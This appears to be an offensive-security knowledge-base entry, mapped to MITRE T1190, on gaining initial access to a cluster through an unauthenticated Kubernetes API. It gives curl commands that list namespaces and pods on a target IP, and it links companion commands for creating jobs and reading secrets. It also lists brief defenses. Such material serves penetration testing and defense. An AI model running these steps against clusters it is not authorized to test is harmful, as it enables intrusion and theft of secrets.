---
tags:
  - initial-access
  - kubernetes
  - misconfiguration
type: procedure
tools:
  - '[[tools/BinaryEdge]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-kubernetes-api-access]]'
  - '[[commands/curl-create-kubernetes-job]]'
  - '[[commands/curl-get-kubernetes-secrets]]'
  - '[[commands/curl-binaryedge-query]]'
platforms:
  - Kubernetes
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: a92b6d9f-8f83-4eb1-bc92-317f7e32b25f
created_at: '2025-12-11T06:10:10.573Z'
updated_at: '2025-12-11T06:10:10.573Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1190]]'
---
# Access Unauthorized Kubernetes API

## Summary

This procedure involves connecting to an exposed Kubernetes API endpoint without authentication to gain initial access to the cluster.

## Description

Exposed Kubernetes APIs without proper access controls allow attackers to query and manipulate cluster resources directly. This step verifies the vulnerability by attempting to list resources like namespaces or pods.

## Requirements

1. Target IP or domain from scanning
2. Network access to port 6443
3. curl or similar HTTP client

## Defense

Defensive measures and detection strategies:

- Enable RBAC and authentication on Kubernetes API
- Use network segmentation to restrict public access

## Objectives

1. Confirm unauthorized access
2. Enumerate cluster resources
3. Prepare for escalation

## Instructions

### Step 1: Test API Connectivity

**Context**: Send a request to the API to list namespaces.

**Command** ([[commands/curl-kubernetes-api-access]]):
```bash
curl -k https://TARGET_IP:6443/api/v1/namespaces
```

> If successful, this returns a JSON list of namespaces without prompting for credentials.

### Step 2: Enumerate Resources

**Context**: Explore other endpoints like pods or nodes.

```bash
curl -k https://TARGET_IP:6443/api/v1/pods
```

> This lists running pods, confirming access level.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-kubernetes-api-access]]

## Tools Used

- [[commands/curl-binaryedge-query]]

## Tags

- [[initial-access]]
- [[commands/curl-kubernetes-api-access]]
